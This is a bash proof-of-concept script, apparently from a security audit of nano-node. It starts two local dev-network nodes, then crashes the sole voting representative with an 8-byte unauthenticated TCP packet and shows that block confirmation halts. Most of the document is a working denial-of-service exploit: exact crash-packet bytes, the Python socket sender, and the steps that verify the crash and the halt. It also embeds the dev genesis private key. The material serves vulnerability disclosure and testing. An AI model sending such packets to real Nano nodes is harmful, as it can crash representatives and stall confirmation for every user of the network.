#!/usr/bin/env bash
# ============================================================================
# SECURITY PoC (authorized whitehat audit) — MULTI-PROCESS chain-halt demo.
#
# Demonstrates the CRITICAL COMPOSITION: a single unauthenticated 8-byte TCP
# packet crashes the voting representative node, and because Nano confirms
# (cements) blocks ONLY when >= quorum of ONLINE representative voting weight
# votes, removing the sole quorum-holding rep HALTS network confirmation.
#
# Chain proven end-to-end with real nano_node processes:
#   1. node_rep (holds genesis weight, the only principal rep) + node_b (observer)
#   2. BASELINE: a send confirms (node_rep votes -> node_b observes confirmed=true)
#   3. ATTACK:  send the 8-byte crash packet to node_rep's peering port -> abort()
#   4. POST:    a new send no longer confirms (no rep online -> no quorum)
#   5. RECOVERY (optional): restart node_rep -> backlog cements.
#
# The 8-byte packet (dev network) decodes to a valid asc_pull_req header whose
# extensions=0xFFFF make payload_length_bytes()=65544 > the 65536 realtime
# buffer, tripping release_assert in tcp_socket::co_read_impl -> abort().
# See nano/core_test/poc_asc_pull_dos.cpp for the in-process root-cause proof.
#
# EXACT WIRE BYTES (verified against source, nano-node v29):
#   byte[0..1] network   = 0x5241 big-endian  -> 52 41   (nano_dev_network 'RA',
#                          networks.hpp:17; serialized big-endian message_header.cpp:41)
#   byte[2]    version_max   = 0x15 (protocol_version,     constants.hpp:214)
#   byte[3]    version_using = 0x15 (>= protocol_version_min 0x14 passes L273 check)
#   byte[4]    version_min   = 0x14 (protocol_version_min,  constants.hpp:216)
#   byte[5]    type          = 0x0e (asc_pull_req,          message_type.hpp:30)
#   byte[6..7] extensions    = 0xFFFF little-endian -> FF FF  (message_header.cpp:46
#                              writes static_cast<uint16_t>(extensions) via nano::write,
#                              which is little-endian for scalars)
#   => PACKET = 52 41 15 15 14 0e ff ff   (8 bytes)
#
# DEPENDS ON OTHER THREADS (cross-check before running):
#   - Crash-packet bytes: the CRASH_PACKET_HEX below MUST match the in-process
#     PoC thread's header serialization. If that thread reports a different
#     extensions value or endianness, update CRASH_PACKET_HEX.
#   - In-process gtest thread proves the quorum->confirmation dependency
#     deterministically; this script is the faithful real-process counterpart.
# ============================================================================

set -u

# ---------------------------------------------------------------------------
# Parameters
# ---------------------------------------------------------------------------
NANO_NODE="${NANO_NODE:-/Users/dx/Documents/audit/nano-node/build/nano_node}"
NANO_RPC="${NANO_RPC:-/Users/dx/Documents/audit/nano-node/build/nano_rpc}"
WORKDIR="${WORKDIR:-/tmp/nano_chain_halt_poc}"

# Distinct ports (loopback only).
REP_PEER_PORT="${REP_PEER_PORT:-44100}"   # node_rep peering (TCP) port  <- attack target
REP_RPC_PORT="${REP_RPC_PORT:-45100}"     # node_rep RPC port
REP_IPC_PORT="${REP_IPC_PORT:-46100}"     # node_rep IPC (child-process RPC) port
B_PEER_PORT="${B_PEER_PORT:-44200}"       # node_b peering port
B_RPC_PORT="${B_RPC_PORT:-45200}"         # node_b RPC port
B_IPC_PORT="${B_IPC_PORT:-46200}"         # node_b IPC port

# Dev genesis key (secure/network_params.cpp:16-17). Holds 100% of dev supply.
GENESIS_PRV="34F0A37AAD20F4A260F0A5B3CB3D7FB50673212263E58A380BC10474BB039CE4"
GENESIS_ACCOUNT="nano_3e3j5tkog48pnny9dmfzj1r16pg8t1e76dz5tmac6iq689wyjfpiij4txtdo"

# 8-byte crash packet (see header above). Depends on in-process PoC thread.
CRASH_PACKET_HEX="${CRASH_PACKET_HEX:-5241151514 0eff ff}"
CRASH_PACKET_HEX="${CRASH_PACKET_HEX//[[:space:]]/}"   # -> 52411515140effff

CONFIRM_TIMEOUT="${CONFIRM_TIMEOUT:-30}"  # seconds to poll for confirmation
HALT_OBSERVE="${HALT_OBSERVE:-30}"        # seconds to confirm NON-confirmation

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
REP_PID=""; B_PID=""
log () { printf '\n[%s] %s\n' "$(date +%H:%M:%S)" "$*"; }
fail () { printf '\n*** FAIL: %s\n' "$*" >&2; cleanup; exit 1; }

cleanup () {
	[ -n "$REP_PID" ] && kill "$REP_PID" 2>/dev/null
	[ -n "$B_PID" ] && kill "$B_PID" 2>/dev/null
	# nano_node spawns nano_rpc child processes; sweep them.
	pkill -f "$WORKDIR/rep" 2>/dev/null
	pkill -f "$WORKDIR/b" 2>/dev/null
	wait 2>/dev/null
}
trap cleanup EXIT

# rpc <rpc_port> <json>  -> prints response body
rpc () {
	curl -s --max-time 10 -g "http://[::1]:$1" -d "$2"
}

# json_get <json> <key>  -> value of a flat string key (no jq dependency)
json_get () {
	printf '%s' "$1" | sed -n 's/.*"'"$2"'"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p'
}

wait_rpc_ready () { # <rpc_port>
	local port="$1" i
	for i in $(seq 1 60); do
		local r; r="$(rpc "$port" '{"action":"version"}')"
		case "$r" in *node_vendor*|*rpc_version*|*protocol_version*) return 0;; esac
		sleep 0.5
	done
	return 1
}

# poll_confirmed <rpc_port> <block_hash> <timeout_s>  -> returns 0 if confirmed
poll_confirmed () {
	local port="$1" hash="$2" timeout="$3" i
	for i in $(seq 1 "$((timeout*2))"); do
		local r; r="$(rpc "$port" "{\"action\":\"block_info\",\"hash\":\"$hash\"}")"
		[ "$(json_get "$r" confirmed)" = "true" ] && return 0
		sleep 0.5
	done
	return 1
}

# ---------------------------------------------------------------------------
# 1. Data dirs + dev configs
# ---------------------------------------------------------------------------
log "Setup: workdir=$WORKDIR"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR/rep" "$WORKDIR/b"

# Bind peering on all interfaces of loopback; RPC + IPC on ::1.
# allow_local_peers=true lets the two loopback nodes peer.
write_node_config () { # <dir> <peer_port> <rpc_port> <ipc_port>
	cat > "$1/config-node.toml" <<EOF
[node]
peering_port = $2
allow_local_peers = true
enable_voting = true
preconfigured_peers = []
[node.ipc.tcp]
enable = true
port = $4
[rpc]
enable = true
[rpc.child_process]
enable = true
rpc_path = "$NANO_RPC"
EOF
	cat > "$1/config-rpc.toml" <<EOF
address = "::1"
port = $3
enable_control = true
[process]
ipc_port = $4
ipc_address = "::1"
EOF
}

write_node_config "$WORKDIR/rep" "$REP_PEER_PORT" "$REP_RPC_PORT" "$REP_IPC_PORT"
write_node_config "$WORKDIR/b"   "$B_PEER_PORT"   "$B_RPC_PORT"   "$B_IPC_PORT"

# ---------------------------------------------------------------------------
# 2. Start both nano_node processes; wait for RPC ready
# ---------------------------------------------------------------------------
log "Starting node_rep (peer=$REP_PEER_PORT rpc=$REP_RPC_PORT)"
"$NANO_NODE" --daemon --network=dev --data_path "$WORKDIR/rep" \
	> "$WORKDIR/rep/stdout.log" 2> "$WORKDIR/rep/stderr.log" &
REP_PID=$!

log "Starting node_b (peer=$B_PEER_PORT rpc=$B_RPC_PORT)"
"$NANO_NODE" --daemon --network=dev --data_path "$WORKDIR/b" \
	> "$WORKDIR/b/stdout.log" 2> "$WORKDIR/b/stderr.log" &
B_PID=$!

wait_rpc_ready "$REP_RPC_PORT" || fail "node_rep RPC never came up (see $WORKDIR/rep/stderr.log)"
wait_rpc_ready "$B_RPC_PORT"   || fail "node_b RPC never came up (see $WORKDIR/b/stderr.log)"
log "Both RPC endpoints are live."

# ---------------------------------------------------------------------------
# 3. Import genesis key into node_rep wallet so it votes; verify principal rep
# ---------------------------------------------------------------------------
log "Importing genesis key into node_rep wallet (makes it the voting rep)"
W_REP="$(json_get "$(rpc "$REP_RPC_PORT" '{"action":"wallet_create"}')" wallet)"
[ -n "$W_REP" ] || fail "wallet_create on node_rep failed"
rpc "$REP_RPC_PORT" "{\"action\":\"wallet_add\",\"wallet\":\"$W_REP\",\"key\":\"$GENESIS_PRV\"}" >/dev/null

# node_b: a fresh wallet + a funded ad-hoc account so node_b can ORIGINATE the
# post-attack send WITHOUT node_rep's wallet (node_rep will be dead by then).
W_B="$(json_get "$(rpc "$B_RPC_PORT" '{"action":"wallet_create"}')" wallet)"
[ -n "$W_B" ] || fail "wallet_create on node_b failed"
KP="$(rpc "$B_RPC_PORT" '{"action":"key_create"}')"
B_PRV="$(json_get "$KP" private)"; B_ACCOUNT="$(json_get "$KP" account)"
rpc "$B_RPC_PORT" "{\"action\":\"wallet_add\",\"wallet\":\"$W_B\",\"key\":\"$B_PRV\"}" >/dev/null
log "node_b funded account = $B_ACCOUNT"

# Peer the two nodes explicitly (preconfigured_peers can't carry a custom port
# on the same host — reachout_preconfigured uses default_node_port, network.cpp:327;
# the keepalive RPC takes an explicit address+port, json_handler.cpp:2756-2761).
rpc "$REP_RPC_PORT" "{\"action\":\"keepalive\",\"address\":\"::1\",\"port\":\"$B_PEER_PORT\"}" >/dev/null
rpc "$B_RPC_PORT"   "{\"action\":\"keepalive\",\"address\":\"::1\",\"port\":\"$REP_PEER_PORT\"}" >/dev/null
sleep 3

# Verify node_rep is the principal representative seen online by node_b.
log "Verifying node_rep holds online voting quorum (via node_b's view)"
for i in $(seq 1 30); do
	QUORUM_JSON="$(rpc "$B_RPC_PORT" '{"action":"confirmation_quorum"}')"
	ONLINE_STAKE="$(json_get "$QUORUM_JSON" online_stake_total)"
	PEERS_STAKE="$(json_get "$QUORUM_JSON" peers_stake_total)"
	# peers_stake_total > 0 means node_b sees the rep's weight via rep_crawler.
	[ -n "$PEERS_STAKE" ] && [ "$PEERS_STAKE" != "0" ] && break
	sleep 1
done
log "confirmation_quorum (node_b): peers_stake_total=$PEERS_STAKE online_stake_total=$ONLINE_STAKE"
REPS_ONLINE="$(rpc "$B_RPC_PORT" '{"action":"representatives_online"}')"
case "$REPS_ONLINE" in
	*"$GENESIS_ACCOUNT"*) log "node_b sees genesis rep ONLINE -> quorum present.";;
	*) log "WARN: genesis rep not yet listed online by node_b; relying on peers_stake_total.";;
esac

# ---------------------------------------------------------------------------
# 4. BASELINE: create+process a send and assert it CONFIRMS
#    Genesis -> node_b's account. Originated on node_rep (holds genesis key);
#    node_rep votes; observe confirmation from node_b's ledger.
# ---------------------------------------------------------------------------
log "BASELINE: sending 1000 raw genesis -> $B_ACCOUNT via node_rep"
SEND1="$(rpc "$REP_RPC_PORT" "{\"action\":\"send\",\"wallet\":\"$W_REP\",\"source\":\"$GENESIS_ACCOUNT\",\"destination\":\"$B_ACCOUNT\",\"amount\":\"1000\"}")"
BLOCK1="$(json_get "$SEND1" block)"
[ -n "$BLOCK1" ] || fail "baseline send failed: $SEND1"
log "Baseline send block = $BLOCK1 ; polling node_b for confirmation (<=${CONFIRM_TIMEOUT}s)"
if poll_confirmed "$B_RPC_PORT" "$BLOCK1" "$CONFIRM_TIMEOUT"; then
	log "BASELINE_CONFIRMED  (node_b observed confirmed=true for $BLOCK1)"
else
	fail "Baseline block never confirmed — environment not producing quorum confirmation; abort demo."
fi

# Make the funded account usable for the post-attack send: have node_b receive
# the pending baseline send into B_ACCOUNT (receive is also rep-confirmed here).
RECV="$(rpc "$B_RPC_PORT" "{\"action\":\"receive\",\"wallet\":\"$W_B\",\"account\":\"$B_ACCOUNT\",\"block\":\"$BLOCK1\"}")"
BRECV="$(json_get "$RECV" block)"
[ -n "$BRECV" ] && poll_confirmed "$B_RPC_PORT" "$BRECV" "$CONFIRM_TIMEOUT" \
	&& log "node_b receive block $BRECV confirmed (account now spendable)."

# ---------------------------------------------------------------------------
# 5. ATTACK: send the 8-byte crash packet to node_rep's peering port
# ---------------------------------------------------------------------------
log "ATTACK: sending 8-byte unauthenticated crash packet to node_rep:$REP_PEER_PORT"
log "        packet bytes = $CRASH_PACKET_HEX  (asc_pull_req, extensions=0xFFFF)"
python3 - "$REP_PEER_PORT" "$CRASH_PACKET_HEX" <<'PY'
import socket, sys
port = int(sys.argv[1]); pkt = bytes.fromhex(sys.argv[2])
assert len(pkt) == 8, f"expected 8-byte header, got {len(pkt)}"
s = socket.create_connection(("::1", port), timeout=5)
s.sendall(pkt)              # node aborts in receive_message_impl -> read_socket(65544)
try:
    s.recv(16)              # connection drops as the process aborts
except Exception:
    pass
s.close()
print(f"sent {len(pkt)} bytes to [::1]:{port}")
PY

# Verify node_rep is DEAD: process gone AND peering port closed.
log "Verifying node_rep crashed"
DEAD=0
for i in $(seq 1 20); do
	if ! kill -0 "$REP_PID" 2>/dev/null; then DEAD=1; break; fi
	sleep 0.5
done
if [ "$DEAD" = "1" ]; then
	wait "$REP_PID" 2>/dev/null; REP_EXIT=$?
	log "node_rep process EXITED (pid $REP_PID, exit/signal status=$REP_EXIT)."
	grep -iE "release_assert|assert|abort|target_size" "$WORKDIR/rep/stderr.log" | tail -5 || true
else
	# Fallback liveness probe: peering port should no longer accept connections.
	if python3 -c "import socket,sys; socket.create_connection(('::1',$REP_PEER_PORT),2).close()" 2>/dev/null; then
		fail "node_rep still alive after crash packet — packet bytes likely wrong (check CRASH_PACKET_HEX vs in-process PoC thread)."
	else
		log "node_rep peering port closed (process effectively down)."
	fi
fi
REP_PID=""   # already reaped; don't double-kill in cleanup

# ---------------------------------------------------------------------------
# 6. POST-ATTACK: new send must NOT confirm (no rep online -> no quorum)
#    Originate on node_b from the funded account; node_rep (sole rep) is dead.
# ---------------------------------------------------------------------------
log "POST-ATTACK: node_b sends 1 raw $B_ACCOUNT -> $GENESIS_ACCOUNT (no rep online)"
SEND2="$(rpc "$B_RPC_PORT" "{\"action\":\"send\",\"wallet\":\"$W_B\",\"source\":\"$B_ACCOUNT\",\"destination\":\"$GENESIS_ACCOUNT\",\"amount\":\"1\"}")"
BLOCK2="$(json_get "$SEND2" block)"
[ -n "$BLOCK2" ] || fail "post-attack send did not even produce a block: $SEND2"
log "Post-attack send block = $BLOCK2 (locally present, must stay UNconfirmed)"
log "Observing NON-confirmation for ${HALT_OBSERVE}s ..."
if poll_confirmed "$B_RPC_PORT" "$BLOCK2" "$HALT_OBSERVE"; then
	fail "Post-attack block CONFIRMED — chain did not halt (rep weight still online?)."
else
	CONF="$(json_get "$(rpc "$B_RPC_PORT" "{\"action\":\"block_info\",\"hash\":\"$BLOCK2\"}")" confirmed)"
	log "CHAIN_HALT_CONFIRMED  (block $BLOCK2 confirmed=$CONF after ${HALT_OBSERVE}s; no quorum -> no cementing)"
fi

# ---------------------------------------------------------------------------
# 7. (Optional) RECOVERY: restart node_rep -> backlog confirms
# ---------------------------------------------------------------------------
if [ "${SHOW_RECOVERY:-1}" = "1" ]; then
	log "RECOVERY: restarting node_rep"
	"$NANO_NODE" --daemon --network=dev --data_path "$WORKDIR/rep" \
		>> "$WORKDIR/rep/stdout.log" 2>> "$WORKDIR/rep/stderr.log" &
	REP_PID=$!
	wait_rpc_ready "$REP_RPC_PORT" || fail "node_rep did not restart"
	# Re-peer so node_b's pending block reaches the revived rep.
	rpc "$REP_RPC_PORT" "{\"action\":\"keepalive\",\"address\":\"::1\",\"port\":\"$B_PEER_PORT\"}" >/dev/null
	rpc "$B_RPC_PORT"   "{\"action\":\"keepalive\",\"address\":\"::1\",\"port\":\"$REP_PEER_PORT\"}" >/dev/null
	log "Polling node_b for confirmation of the previously-stuck block $BLOCK2 (<=${CONFIRM_TIMEOUT}s)"
	if poll_confirmed "$B_RPC_PORT" "$BLOCK2" "$CONFIRM_TIMEOUT"; then
		log "RECOVERY_CONFIRMED  (rep back online -> backlog $BLOCK2 cemented)"
	else
		log "RECOVERY: block not yet cemented within timeout (rep may need longer to re-sync)."
	fi
fi

log "DONE. Demonstrated: crash rep -> quorum lost -> confirmation halts -> recovery on restart."
cleanup; trap - EXIT
exit 0
